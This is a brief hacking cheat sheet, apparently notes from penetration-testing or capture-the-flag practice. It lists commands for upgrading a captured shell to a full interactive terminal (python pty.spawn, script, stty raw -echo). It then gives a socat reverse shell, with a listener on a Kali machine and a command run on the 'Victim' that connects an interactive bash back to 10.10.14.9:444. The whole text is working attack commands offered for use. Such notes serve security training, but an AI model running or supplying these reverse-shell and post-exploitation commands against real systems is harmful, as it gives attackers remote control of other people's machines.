
`script -qc /bin/bash /dev/null`

`python3 -c 'import pty;pty.spawn("/bin/bash")'`
or `python -c 'import pty;pty.spawn("/bin/bash")'` if ooold python

Ctrl+z
`stty raw -echo; fg` (ctrl+c and other special chars sent + turning of echo)
`export TERM=xterm`



Instead of a simple nc, use this (= starting with a better shell instead):

On Kali (listen):
`socat file:tty,raw,echo=0 tcp-listen:444`

On Victim (launch):
`socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.9:444`
